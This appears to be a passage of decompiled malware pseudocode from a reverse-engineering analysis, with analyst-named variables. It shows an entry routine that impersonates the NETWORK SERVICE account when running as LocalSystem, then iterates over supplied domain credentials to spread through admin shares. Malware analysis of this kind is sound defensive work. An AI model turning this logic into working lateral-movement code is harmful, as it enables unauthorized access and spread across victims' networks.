
void __cdecl __noreturn exec_x32_1(int a1, int a2, LPCWSTR lpCmdLine)
{
  mw_ctx.wstr_dll = L"dll";
  mw_ctx.field_0 = 0;
  mw_ctx.path_to_copy_file = 0;
  mw_ctx.remote_network_resource = 0;
  *&mw_ctx.remote_admin_share_target = 0i64;
  *&mw_ctx.is_connect_to_admin_share = 0;
  mw_ctx.dwValue = 0;
  mw_ctx.wstr_random_guid = mw_create_random_guid();
  mw_ctx.is_run_as_local_system = mw_is_curr_process_run_as_local_system_acc();
  v_data.szArgList_c = 0;
  v_data.szArgList_a = 0;
  *&v_data.pNumArgs_c = 0i64;
  if ( mw_ctx.is_run_as_local_system )
  {
    phToken = 0;
    // This logon type allows the caller to clone its current token and specify new credentials for outbound connections.
    // Impersonate network service account
    if ( LogonUserW(L"NETWORK SERVICE", L"NT AUTHORITY", 0, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &phToken) )
    {
      ImpersonateLoggedOnUser(phToken);
      CloseHandle(phToken);
    }
  }
  if ( mw_parse_command_line_args(&v_data, &mw_ctx, lpCmdLine) )
  {
    v_counter = 0;
    if ( v_data.pNumArgs_c > 0 )
    {
      vp_buffer = &v_data.ptr_buffer_c->password;
      do
      {
        if ( mw_ctx.is_service )
          break;
        mw_ctx.domain_name = ADJ(vp_buffer)->domain_name;
        mw_ctx.username = ADJ(vp_buffer)->username;
        mw_ctx.password = ADJ(vp_buffer)->password;
        mw_main_proc(&mw_ctx);
        ++v_counter;
        vp_buffer += 3;
      }
      while ( v_counter < v_data.pNumArgs_c );
    }
    v_counter = 0;
    if ( v_data.pNumArgs_a <= 0 )
    {
LABEL_13:
      if ( !mw_ctx.is_service )
      {
        mw_ctx.domain_name = 0;
        mw_ctx.username = 0;
        mw_ctx.password = 0;
        mw_main_proc(&mw_ctx);
      }
    }
    else
    {
      vp_buffer = &v_data.ptr_buffer_a->password;
      while ( !mw_ctx.is_service )
      {
        mw_ctx.domain_name = ADJ(vp_buffer)->domain_name;
        mw_ctx.username = ADJ(vp_buffer)->username;
        mw_ctx.password = ADJ(vp_buffer)->password;
        mw_main_proc(&mw_ctx);
        ++v_counter;
        vp_buffer += 3;
        if ( v_counter >= v_data.pNumArgs_a )
          goto LABEL_13;
      }
    }
  }
  ExitProcess(!mw_ctx.dwValue);
}

